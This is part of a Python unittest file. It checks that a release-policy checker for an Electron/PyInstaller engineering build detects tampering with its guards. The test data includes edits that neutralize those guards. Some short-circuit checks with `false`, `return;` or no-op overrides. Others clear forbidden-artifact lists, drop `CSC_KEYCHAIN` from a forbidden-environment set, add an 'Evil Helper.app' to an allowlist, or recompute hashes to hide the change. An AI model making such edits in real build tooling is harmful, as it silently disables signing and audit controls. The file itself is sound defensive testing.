            ("        info.nlink === 1 &&", "        true &&"),
            (
                '(lower.endsWith(".zip") && !isReviewedPyInstallerArchive)',
                'lower.endsWith(".zip") && false',
            ),
            (
                "if (!observedReviewedPyInstallerArchive) {",
                "if (false) {",
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "bundle_audit", old, new)
                self.assertIn(
                    "engineering PyInstaller archive exception drifted",
                    CHECKER.validate_policy(current),
                )

        document_contract_mutations = (
            (
                "let observedReviewedPyInstallerArchive = false;",
                "let observedReviewedPyInstallerArchive = true;",
            ),
            (
                '(lower.endsWith(".zip") && !isReviewedPyInstallerArchive)',
                '((lower.endsWith(".zip") && !isReviewedPyInstallerArchive) && false)',
            ),
        )
        for old, new in document_contract_mutations:
            with self.subTest(document_contract=old):
                current = inputs()
                changed(current, "bundle_audit", old, new)
                self.assertIn(
                    "engineering bundle auditor document contract drifted",
                    CHECKER.validate_policy(current),
                )
                with mock.patch.object(
                    CHECKER,
                    "EXPECTED_BUNDLE_AUDIT_SHA256",
                    hashlib.sha256(
                        str(current["bundle_audit"]).encode("utf-8")
                    ).hexdigest(),
                ):
                    self.assertIn(
                        "engineering PyInstaller archive exception drifted",
                        CHECKER.validate_policy(current),
                    )

    def test_prepare_pr_signing_guard_cannot_be_neutralized(self) -> None:
        current = inputs()
        changed(
            current,
            "prepare",
            '    Object.prototype.hasOwnProperty.call(environment, "CSC_FOR_PULL_REQUEST") &&',
            '    false &&\n'
            '    Object.prototype.hasOwnProperty.call(environment, "CSC_FOR_PULL_REQUEST") &&',
        )
        self.assertIn(
            "engineering prepare document contract drifted",
            CHECKER.validate_policy(current),
        )
        mutated_prepare = str(current["prepare"])
        mutated_prepare_function = CHECKER._source_block(
            mutated_prepare,
            "function assertNoProductionEnvironment",
            "\nfunction assertEngineeringSmokeMode",
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_SHA256",
            hashlib.sha256(mutated_prepare.encode("utf-8")).hexdigest(),
        ), mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_ENVIRONMENT_FUNCTION_SHA256",
            hashlib.sha256(mutated_prepare_function.encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering PR signing guard drifted",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        changed(
            current,
            "prepare",
            "function assertNoProductionEnvironment(environment) {",
            "function assertNoProductionEnvironment(environment) {\n  return;",
        )
        mutated_prepare = str(current["prepare"])
        mutated_prepare_function = CHECKER._source_block(
            mutated_prepare,
            "function assertNoProductionEnvironment",
            "\nfunction assertEngineeringSmokeMode",
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_SHA256",
            hashlib.sha256(mutated_prepare.encode("utf-8")).hexdigest(),
        ), mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_ENVIRONMENT_FUNCTION_SHA256",
            hashlib.sha256(mutated_prepare_function.encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering production-environment control flow drifted",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        original_function = CHECKER._source_block(
            str(current["prepare"]),
            "function assertNoProductionEnvironment",
            "\nfunction assertEngineeringSmokeMode",
        )
        body = original_function.split("{\n", 1)[1].rsplit("\n}", 1)[0]
        wrapped_function = (
            "function assertNoProductionEnvironment(environment) {\n"
            "  if (false) {\n  "
            + body.replace("\n", "\n  ")
            + "\n  }\n}\n"
        )
        current["prepare"] = str(current["prepare"]).replace(
            original_function,
            wrapped_function,
            1,
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_SHA256",
            hashlib.sha256(str(current["prepare"]).encode("utf-8")).hexdigest(),
        ), mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_ENVIRONMENT_FUNCTION_SHA256",
            hashlib.sha256(wrapped_function.encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering production-environment control flow drifted",
                CHECKER.validate_policy(current),
            )

    def test_archive_observation_cannot_be_preseeded_after_initialization(self) -> None:
        current = inputs()
        changed(
            current,
            "bundle_audit",
            "  let observedReviewedPyInstallerArchive = false;",
            "  let observedReviewedPyInstallerArchive = false;\n"
            "  observedReviewedPyInstallerArchive = true;",
        )
        mutated_bundle_audit = str(current["bundle_audit"])
        mutated_artifact_function = CHECKER._source_block(
            mutated_bundle_audit,
            "function assertNoInstallOrReleaseArtifacts",
            "\nfunction writeExternalEvidence",
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_BUNDLE_AUDIT_SHA256",
            hashlib.sha256(mutated_bundle_audit.encode("utf-8")).hexdigest(),
        ), mock.patch.object(
            CHECKER,
            "EXPECTED_INSTALL_ARTIFACT_FUNCTION_SHA256",
            hashlib.sha256(mutated_artifact_function.encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering install-artifact control flow drifted",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        changed(
            current,
            "bundle_audit",
            "  if (forbidden.length > 0) {",
            "  forbidden.length = 0;\n  if (forbidden.length > 0) {",
        )
        mutated_bundle_audit = str(current["bundle_audit"])
        mutated_artifact_function = CHECKER._source_block(
            mutated_bundle_audit,
            "function assertNoInstallOrReleaseArtifacts",
            "\nfunction writeExternalEvidence",
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_BUNDLE_AUDIT_SHA256",
            hashlib.sha256(mutated_bundle_audit.encode("utf-8")).hexdigest(),
        ), mock.patch.object(
            CHECKER,
            "EXPECTED_INSTALL_ARTIFACT_FUNCTION_SHA256",
            hashlib.sha256(mutated_artifact_function.encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering install-artifact control flow drifted",
                CHECKER.validate_policy(current),
            )

    def test_critical_allowlists_and_callers_are_closed(self) -> None:
        mutations = (
            (
                "prepare",
                '  "CSC_KEYCHAIN",\n',
                "",
                "engineering forbidden production environment set drifted",
            ),
            (
                "bundle_audit",
                "  `${PRODUCT_NAME} Helper (Renderer).app`\n",
                "  `${PRODUCT_NAME} Helper (Renderer).app`,\n"
                '  "Evil Helper.app"\n',
                "engineering Electron helper allowlist drifted",
            ),
            (
                "prepare",
                "function validateHost(platformName, architecture) {",
                "assertNoProductionEnvironment = () => {};\n\n"
                "function validateHost(platformName, architecture) {",
                "engineering production-environment caller closure drifted",
            ),
            (
                "bundle_audit",
                "function createAuditEngineeringSmokeBundle(dependencies = {}) {",
                "assertNoInstallOrReleaseArtifacts = () => {};\n\n"
                "function createAuditEngineeringSmokeBundle(dependencies = {}) {",
                "engineering install-artifact caller closure drifted",
            ),
            (
                "bundle_audit",
                "    assertNoInstallOrReleaseArtifacts(outputRoot, appRoot);\n",
                "",
                "engineering install-artifact caller closure drifted",
            ),
        )
        for key, old, new, expected in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                if key == "prepare":
                    document_hash = hashlib.sha256(
                        str(current[key]).encode("utf-8")
                    ).hexdigest()
                    patch = mock.patch.object(
                        CHECKER,
                        "EXPECTED_PREPARE_SHA256",
                        document_hash,
                    )
                else:
                    document_hash = hashlib.sha256(
                        str(current[key]).encode("utf-8")
                    ).hexdigest()
                    patch = mock.patch.object(
                        CHECKER,
                        "EXPECTED_BUNDLE_AUDIT_SHA256",
                        document_hash,
                    )
                with patch:
                    self.assertIn(expected, CHECKER.validate_policy(current))

    def test_manifest_schema_cannot_be_open_or_publishable(self) -> None:
        current = inputs()
        schema = copy.deepcopy(current["schema"])
        schema["additionalProperties"] = True
        current["schema"] = schema
        self.assertTrue(any("additional properties" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        schema = copy.deepcopy(current["schema"])
        schema["properties"]["distribution"]["properties"]["publishable"]["const"] = True
        current["schema"] = schema
        self.assertTrue(any("constant" in error for error in CHECKER.validate_policy(current)))

    def test_manifest_schema_requires_exact_tree_and_snapshot_provenance(self) -> None:
        for path, field in (
            (("properties", "source", "required"), "sourceSnapshotSha256"),
            (
                (
                    "properties",
                    "components",
                    "properties",
                    "pythonSidecar",
                    "required",
                ),
                "repositoryTree",
            ),
            (
                (
                    "properties",
                    "components",
                    "properties",
                    "pythonSidecar",
                    "required",
                ),
                "sourceSnapshotSha256",
            ),
        ):
            with self.subTest(path=path, field=field):
                current = inputs()
                schema = copy.deepcopy(current["schema"])
                required = schema
                for key in path:
                    required = required[key]
                required.remove(field)
                current["schema"] = schema
                self.assertTrue(
                    any(
                        "schema required properties" in error
                        for error in CHECKER.validate_policy(current)
                    )
                )

        for path in (
            (
                "properties",
                "source",
                "properties",
                "sourceSnapshotSha256",
                "pattern",
            ),
            (
                "properties",
                "components",
                "properties",
                "pythonSidecar",
                "properties",
                "repositoryTree",
                "pattern",
            ),
        ):
            with self.subTest(path=path):
                current = inputs()
                schema = copy.deepcopy(current["schema"])
                value = schema
                for key in path[:-1]:
                    value = value[key]
                value[path[-1]] = ".*"
                current["schema"] = schema
                self.assertTrue(
                    any(
                        "schema provenance pattern" in error
                        for error in CHECKER.validate_policy(current)
                    )
                )

    def test_packaging_hooks_cannot_fall_back_or_drop_tree_snapshot_binding(self) -> None:
        current = inputs()
        changed(
            current,
            "prepare",
            'const commit = (environment.LCF_SOURCE_SHA || "").toLowerCase();',
            'const commit = (environment.LCF_SOURCE_SHA || environment.GITHUB_SHA || "").toLowerCase();',
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_SHA256",
            hashlib.sha256(str(current["prepare"]).encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering prepare must not fall back to GITHUB_SHA",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        current["before_pack"] = str(current["before_pack"]).replace(
            "sourceSnapshotSha256",
            "sourceSnapshotShh256",
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_BEFORE_PACK_SHA256",
            hashlib.sha256(str(current["before_pack"]).encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering beforePack provenance contract missing 'sourceSnapshotSha256'",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        current["formal_before_pack"] = str(current["formal_before_pack"]).replace(
            "LCF_SOURCE_TREE",
            "LCF_SOURCE_TR33",
        )
        expected_hashes = dict(CHECKER.EXPECTED_FORMAL_BOUNDARY_SHA256)
        expected_hashes["formal beforePack"] = hashlib.sha256(
            str(current["formal_before_pack"]).encode("utf-8")
        ).hexdigest()
        with mock.patch.object(
            CHECKER,
            "EXPECTED_FORMAL_BOUNDARY_SHA256",
            expected_hashes,
        ):
            self.assertIn(
                "formal beforePack provenance contract missing 'LCF_SOURCE_TREE'",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        current["common_audit"] = str(current["common_audit"]).replace(
            "sourceSnapshotSha256",
            "sourceSnapshotShh256",
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_COMMON_AUDIT_SHA256",
            hashlib.sha256(str(current["common_audit"]).encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering common audit provenance contract missing 'sourceSnapshotSha256'",
                CHECKER.validate_policy(current),
            )

    def test_w02_status_cannot_regress_or_promote_the_gate(self) -> None:
        current = inputs()
        changed(
            current,
            "todo",
            "| TODO-PACKAGED-SMOKE-001 | Priority-0 | W02 | `in-progress` |",
            "| TODO-PACKAGED-SMOKE-001 | Priority-0 | W02 | `planned` |",
        )
        self.assertTrue(any("W02 TODO" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        row = next(
            line
            for line in str(current["trace"]).splitlines()
            if line.startswith("| VAL-PACKAGED-SMOKE-001 |")
        )
        current["trace"] = str(current["trace"]).replace(
            row, row.replace("`not-run`", "`pass`", 1), 1
        )
        self.assertTrue(any("canonically not-run" in error for error in CHECKER.validate_policy(current)))

    def test_w02a_cannot_become_a_stable_id(self) -> None:
        current = inputs()
        current["iteration"] = str(current["iteration"]) + "\nTODO-W02A-001\n"
        self.assertTrue(any("stable ID" in error for error in CHECKER.validate_policy(current)))


if __name__ == "__main__":
    unittest.main()
